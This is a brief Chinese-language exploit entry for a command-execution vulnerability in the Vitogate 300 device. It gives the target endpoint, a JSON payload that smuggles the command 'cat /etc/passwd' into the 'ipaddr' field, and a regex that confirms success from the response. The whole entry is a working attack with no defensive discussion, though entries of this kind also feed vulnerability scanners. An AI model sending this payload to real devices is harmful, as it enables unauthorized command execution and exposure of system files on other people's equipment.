# Vitogate300Authentication命令执行漏洞

Vitogate300Authentication ｜ 命令执行 ｜ —
- **请求**：`POST /cgi-bin/vitogate.cgi HTTP/1.1`

**Payload**
```
{"method":"put","form":"form-4-8","session":"","params":{"ipaddr":"1;cat /etc/passwd"}}
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$